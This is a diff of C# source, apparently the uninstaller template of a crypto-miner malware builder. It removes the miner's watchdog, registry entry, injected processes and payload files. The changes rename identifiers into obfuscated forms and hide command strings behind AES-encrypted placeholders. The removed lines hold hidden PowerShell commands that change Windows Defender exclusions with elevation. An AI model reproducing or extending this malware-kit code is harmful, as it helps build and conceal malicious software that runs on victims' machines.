@@ -15,13 +15,11 @@ using System.Management;
 using System.Windows.Forms;
 #endif
 
-[assembly: Guid("%Guid%")]
-
 public partial class RUninstaller
 {
-    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH"));
+    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
 #if DefSystem32
-    public static string rbD2 = (Environment.SystemDirectory + @"\" + RGetString("#LIBSPATH"));
+    public static string _rbD2_ = (Environment.SystemDirectory + @"\" + _rGetString_("#LIBSPATH"));
 #endif
 
     public static void Main()
@@ -29,10 +27,22 @@ public partial class RUninstaller
 #if DefInstall
         try
         {
-            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
+            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
             {
                 proc.Kill();
             }
+
+            try
+            {
+                File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
+            } 
+            catch {}
+
+            try
+            {
+                File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + "-2.log"));
+            } 
+            catch {}
         }
         catch (Exception ex)
         {
@@ -43,7 +53,7 @@ public partial class RUninstaller
 
         try
         {
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RGetString("#REGKEY"), true))
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_rGetString_("#REGKEY"), true))
             {
                 if (key != null)
                 {
@@ -51,12 +61,7 @@ public partial class RUninstaller
                 }
             }
         }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show("This exception is normal." + Environment.NewLine + "U2: " + Environment.NewLine + ex.ToString());
-#endif
-        }
+        catch {}
 
         try
         {
@@ -79,26 +84,17 @@ public partial class RUninstaller
 
         try
         {
-            var options = new ConnectionOptions();
-            options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\root\cimv2", options);
-            scope.Connect();
+            var _rarg1_ = new ConnectionOptions();
+            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
+            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
+            _rarg2_.Connect();
 
-            string wmiQuery = string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
-            var query = new ObjectQuery(wmiQuery);
-            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
-            var managementObjectCollection = managementObjectSearcher.Get();
-            foreach (ManagementObject retObject in managementObjectCollection)
+            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
+            foreach (ManagementObject MemObj in _rarg3_)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-x"))
+                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains("--cinit-find-x") || MemObj["CommandLine"].ToString().Contains("/" + _rGetString_("#WATCHDOG"))))
                 {
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "cmd",
-                        Arguments = "/c taskkill /f /PID " + retObject["ProcessID"] + " & exit",
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
+                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                 }
             }
         }
@@ -112,63 +108,61 @@ public partial class RUninstaller
         Thread.Sleep(3000);
         try
         {
-            Directory.Delete(rbD, true);
+            Directory.Delete(_rbD_, true);
 #if DefSystem32
-            Directory.Delete(rbD2, true);
+            Directory.Delete(_rbD2_, true);
 #endif
 #if DefInstall
             File.Delete(PayloadPath);
 #endif
         }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show("This exception is normal. " + Environment.NewLine + "U5: " + Environment.NewLine + ex.ToString());
-#endif
-        }
+        catch {}
+        Environment.Exit(0);
+    }
 
-#if DefKillWD
-        
+    public static string _rGetString_(string _rarg1_)
+    {
+        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+    }
+
+    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    {
+        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
+        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
+        using (var _rarg7_ = new MemoryStream())
+        {
+            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            {
+                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
+                _rarg8_.Close();
+            }
+
+            return _rarg7_.ToArray();
+        }
+    }
+
+    public static void _rCommand_(string _rarg1_, string _rarg2_)
+    {
         try
         {
             Process.Start(new ProcessStartInfo
             {
-                FileName = "cmd",
-                Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & powershell -Command Remove-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+                FileName = _rarg1_,
+                Arguments = _rarg2_,
+                WorkingDirectory = Environment.SystemDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
-                Verb = "runas"
+                UseShellExecute = false,
+                RedirectStandardOutput = true
             });
         }
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show("U6: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
 #endif
-        }
-#endif
-    }
-
-    public static string RGetString(string rarg1)
-    {
-        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
-    }
-
-    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
-    {
-        var rarg3 = Encoding.ASCII.GetBytes("#IV");
-        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
-        using (var rarg7 = new MemoryStream())
-        {
-            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
-            {
-                rarg8.Write(rarg1, 0, rarg1.Length);
-                rarg8.Close();
-            }
-
-            return rarg7.ToArray();
         }
     }
 }
